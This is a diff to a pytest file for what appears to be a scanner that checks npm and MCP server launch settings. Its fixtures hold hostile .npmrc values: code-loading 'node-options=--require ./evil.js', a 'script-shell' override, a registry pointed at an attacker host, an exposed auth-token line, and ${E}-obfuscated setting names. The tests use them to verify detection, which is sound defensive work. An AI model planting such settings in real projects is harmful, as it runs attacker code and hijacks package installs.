@@ -454,8 +454,8 @@ def test_an_absolute_npm_configuration_location_passes_the_gate(tmp_path):
     assert server["properties"]["package_sources"] == ["env:npm_config_userconfig=[local]"]
 
 
-def test_a_call_added_to_the_named_file_cannot_drift_past_the_gates(tmp_path, monkeypatch):
-    # The finding: the keyed diff saw no change when only the named file gained `call`.
+def test_a_setting_added_to_the_named_file_cannot_drift_past_the_gates(tmp_path, monkeypatch):
+    # The finding: the keyed diff saw no change when only the named file gained a setting.
     monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
     root = tmp_path / "project"
     server = {**NPX, "env": {"npm_config_userconfig": ".npmrc-ci"}}
@@ -463,7 +463,7 @@ def test_a_call_added_to_the_named_file_cannot_drift_past_the_gates(tmp_path, mo
     baseline = tmp_path / "baseline.json"
     gate = scan_cli(root, baseline)
     assert gate.exit_code == 1 and "Scan gate failed" in gate.output
-    (root / ".npmrc-ci").write_text("fund=false\ncall=node ./postinstall-helper.js\n")
+    (root / ".npmrc-ci").write_text("fund=false\nnode-options=--require ./postinstall-helper.js\n")
     candidate = tmp_path / "candidate.json"
     assert scan_cli(root, candidate, "--report-only").exit_code == 0
     validated = CliRunner().invoke(
@@ -489,3 +489,156 @@ def test_moving_a_reviewed_location_into_the_project_is_an_alert(tmp_path, monke
     compared = CliRunner().invoke(main, ["diff", str(baseline), str(candidate), "--fail-on-alert"])
     assert compared.exit_code == 1, compared.output
     assert moved("userconfig") in compared.output
+
+
+COMMIT = "0123456789abcdef0123456789abcdef01234567"
+# Full-commit git launches keep a known identity, and npm reads its configuration for them.
+GIT_LAUNCHES = {
+    "npx": ["-y", f"github:acme/mcp-server#{COMMIT}"],
+    "npx-git+https": ["-y", f"git+https://git.acme.test/acme/mcp-server.git#{COMMIT}"],
+    "npm": ["exec", "--yes", f"--package=github:acme/mcp-server#{COMMIT}", "--", "mcp-server"],
+    "pnpm": ["dlx", f"github:acme/mcp-server#{COMMIT}"],
+}
+
+
+def git_server(launch: str, *options: str) -> dict[str, Any]:
+    command = launch.split("-", 1)[0]
+    args = GIT_LAUNCHES[launch]
+    if command == "npx":
+        return {"command": command, "args": [*options, *args]}
+    return {"command": command, "args": [args[0], *options, *args[1:]]}
+
+
+@pytest.mark.parametrize("launch", sorted(GIT_LAUNCHES))
+def test_a_pinned_git_launch_keeps_its_identity_without_relocation(tmp_path, launch):
+    record, gaps = collect(tmp_path, git_server(launch), {".npmrc": "fund=false\n"})
+    identity_kept(record, gaps)
+
+
+@pytest.mark.parametrize("launch", sorted(GIT_LAUNCHES))
+@pytest.mark.parametrize("option", ["--userconfig", "--prefix"])
+def test_a_location_option_moves_npm_configuration_for_a_pinned_git_launch(
+    tmp_path, launch, option
+):
+    record, gaps = collect(tmp_path, git_server(launch, option, ".npmrc-ci"))
+    detail = identity_unknown(record, gaps)
+    # pnpm dlx takes neither option, so its launch is already unrecognised.
+    assert f"{option} {MOVES}" in detail or "unrecognised pnpm dlx option" in detail
+
+
+@pytest.mark.parametrize("launch", sorted(GIT_LAUNCHES))
+@pytest.mark.parametrize(
+    "npmrc,reason",
+    [
+        ("userconfig=.npmrc-ci\n", moved("userconfig", ".npmrc")),
+        ("call=node ./postinstall-helper.js\n", "npm call setting from .npmrc"),
+        ("${E}globalconfig=g\n", "npm setting name with ${...} from .npmrc"),
+    ],
+)
+def test_the_project_npmrc_is_read_for_a_pinned_git_launch(tmp_path, launch, npmrc, reason):
+    record, gaps = collect(tmp_path, git_server(launch), {".npmrc": npmrc})
+    assert reason in identity_unknown(record, gaps)
+
+
+def test_a_code_loading_npmrc_setting_is_recorded_for_a_pinned_git_launch(tmp_path):
+    files = {".npmrc": "node-options=--require ./evil.js\n"}
+    record, gaps = collect(tmp_path, git_server("npx"), files)
+    identity_kept(record, gaps)
+    assert record.properties["launch_context"]["code_loading_setting"] == 1
+
+
+@pytest.mark.parametrize("option", ["--userconfig", "--prefix"])
+@pytest.mark.parametrize("form", ["option", "npmrc"])
+def test_the_gate_fails_for_a_pinned_git_launch_that_moves_npm_configuration(
+    tmp_path, monkeypatch, option, form
+):
+    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    root = tmp_path / "project"
+    files = {".npmrc-ci": "fund=false\n"}
+    if form == "option":
+        server = git_server("npx", option, ".npmrc-ci")
+    else:
+        server = git_server("npx")
+        files[".npmrc"] = f"{option[2:]}=.npmrc-ci\n"
+    write_project(root, server, files)
+    result = scan_cli(root, tmp_path / "bom.json")
+    assert result.exit_code == 1, result.output
+    assert "Scan gate failed" in result.output
+
+
+@pytest.mark.parametrize(
+    "server",
+    [
+        {"command": "npm", "args": ["run", "mcp"]},
+        {"command": "pnpm", "args": ["run", "mcp"]},
+        {"command": "bun", "args": ["run", "mcp"]},
+        {"command": "deno", "args": ["run", "--allow-net", "server.ts"]},
+    ],
+)
+@pytest.mark.parametrize(
+    "npmrc,reason",
+    [
+        ("userconfig=.npmrc-ci\n", moved("userconfig", ".npmrc")),
+        ("${E}prefix=ci\n", "npm setting name with ${...} from .npmrc"),
+    ],
+)
+def test_a_launch_without_a_package_still_sees_a_moved_npm_configuration(
+    tmp_path, server, npmrc, reason
+):
+    record, gaps = collect(tmp_path, server, {".npmrc": npmrc})
+    assert any(reason in gap for gap in gaps), gaps
+
+
+@pytest.mark.parametrize(
+    "npmrc",
+    [
+        "${E}call=node ./evil.js\n//${NPM_REGISTRY_HOST}/:_authToken=${NPM_TOKEN}\n",
+        "${E}userconfig=.npmrc-ci\n${E}save-exact=true\n",
+    ],
+)
+def test_a_later_harmless_unresolved_name_keeps_an_earlier_finding(tmp_path, npmrc):
+    record, gaps = collect(tmp_path, {**NPX, "env": {"E": ""}}, {".npmrc": npmrc})
+    assert "npm setting name with ${...} from .npmrc" in identity_unknown(record, gaps)
+
+
+@pytest.mark.parametrize("npmrc", ["call${E}all=x\n", "prefix${E}prefix=x\n"])
+def test_a_name_longer_than_any_setting_it_starts_and_ends_like_stays_unresolved(tmp_path, npmrc):
+    record, gaps = collect(tmp_path, NPX, {".npmrc": npmrc})
+    identity_kept(record, gaps)
+    assert ".npmrc:key=[unresolved]" in record.properties["package_sources"]
+
+
+@pytest.mark.parametrize("npmrc", ["${E}node-options=--require ./evil.js\n", "${E}=./evil.js\n"])
+def test_an_unresolved_name_that_may_load_code_is_recorded(tmp_path, npmrc):
+    record, _ = collect(tmp_path, {**NPX, "env": {"E": ""}}, {".npmrc": npmrc})
+    assert record.properties["launch_context"]["code_loading_setting"] == 1
+
+
+@pytest.mark.parametrize(
+    "after",
+    [
+        "${E}node-options=--require ./evil.js\n",
+        "${E}script-shell=./evil.sh\n",
+        "${E}registry=https://npm.attacker.test/\n",
+        "${E}fund=true\n",
+    ],
+)
+def test_rewriting_an_unresolved_npmrc_line_is_an_alert(tmp_path, monkeypatch, after):
+    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    root = tmp_path / "project"
+    server = {**NPX, "env": {"E": ""}}
+    write_project(root, server, {".npmrc": "${E}fund=false\n"})
+    baseline = tmp_path / "baseline.json"
+    assert scan_cli(root, baseline).exit_code == 0
+    write_project(root, server, {".npmrc": after})
+    candidate = tmp_path / "candidate.json"
+    assert scan_cli(root, candidate, "--report-only").exit_code == 0
+    compared = CliRunner().invoke(main, ["diff", str(baseline), str(candidate), "--fail-on-alert"])
+    assert compared.exit_code == 1, compared.output
+    assert "static source binding changed" in compared.output
+
+
+def test_an_unresolved_npmrc_line_is_an_unbound_value_without_the_key(tmp_path):
+    record, _ = collect(tmp_path, {**NPX, "env": {"E": ""}}, {".npmrc": "${E}fund=false\n"})
+    completeness = [r.detail for r in record.risks if r.category == "completeness"]
+    assert any("project resolver settings" in detail for detail in completeness), completeness
